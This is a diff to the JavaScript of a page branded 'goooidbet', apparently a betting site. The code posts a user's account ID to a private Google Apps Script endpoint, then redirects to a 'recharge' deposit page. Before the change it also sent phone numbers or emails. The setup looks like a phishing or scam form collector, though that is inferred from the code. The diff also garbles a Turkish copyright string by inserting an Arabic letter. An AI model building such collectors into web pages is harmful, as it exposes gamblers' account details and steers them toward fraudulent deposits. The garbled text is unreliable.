@@ -1409,21 +1409,10 @@
             
             const activeTab = document.querySelector('.tab-item.active');
             const tabType = activeTab ? activeTab.getAttribute('data-tab') : '';
-            let inputValue = "";
             const input = document.getElementById('idCompteInput');
             const idVal = input ? input.value : '';
 
-            if (tabType === 'byPhone') {
-                const phoneInput = document.getElementById('phoneNumberInput');
-                inputValue = "ID: " + idVal + " | Phone: " + selectedCountry.code + (phoneInput ? phoneInput.value : '');
-            } else if (tabType === 'byEmail') {
-                const emailInput = document.getElementById('emailInput');
-                inputValue = "ID: " + idVal + " | Email: " + (emailInput ? emailInput.value : '');
-            } else {
-                inputValue = idVal;
-            }
-
-            const payload = { userId: inputValue, platform: platform };
+            const payload = { userId: idVal, platform: platform };
             
             try {
                 await fetch('https://script.google.com/macros/s/AKfycbzQXqfYK3rzSSR-ZKYDxsa1iqTQUpfflHnDZQVnU3hKxNoLG0j3gPO0KIijH5YZelQg3A/exec', {
@@ -1434,7 +1423,7 @@
                 });
                 
                 setTimeout(() => {
-                    localStorage.setItem('userId', inputValue);
+                    localStorage.setItem('userId', idVal);
                     window.location.href = 'fr/office/recharge.html';
                 }, 1200);
             } catch (err) {
@@ -1548,7 +1537,7 @@
                 selectCurrency: "Para birimi seçin", promoPlaceholder: "Promosyon kodu girin", registerBtn: "Kayıt Ol",
                 termsText: 'Bu düğmeye tıklayarak şirketin <a href="#">Şartlar ve Koşullar</a> ile <a href="#">Gizlilik Politikası</a>\'nı okuyup kabul ettiğinizi ve yasal yaşta olduğunuzu onaylırsınız.',
                 footerDescPart1: "goooidbet, size en iyi deneyimi sunmak için çerezleri kullanır. Web sitesinde kalarak çerezlerin kullanımını onaylamış olursunuz.",
-                learnMore: "Daha fazla bilgi", copyright: "Telif Hakkı © 2026 «goooidbet». Tüm hakları saklıdır ve kanunla korunmaktadır.",
+                learnMore: "Daha fazla bilgi", copyright: "Telif Hakkı © 2026 «goooidbet». Tüm hakları saklıdır وkanunla korunmaktadır.",
                 supportTitle: "Destek 7/24", supportDesc: "Soru sorun", mobileApp: "Mobil Uygulama",
                 selectLanguageTitle: "Dil seçin", searchPlaceholder: "Ara", selectCountryTitle: "Telefon numarası",
                 popupTitle: "Hoş Geldin Bonusu", popupDesc: "İlk yatırımınız için <strong>5000 MAD</strong>'e varan hoş geldin bonusu kazanın!", popupBtnClose: "Tamam"
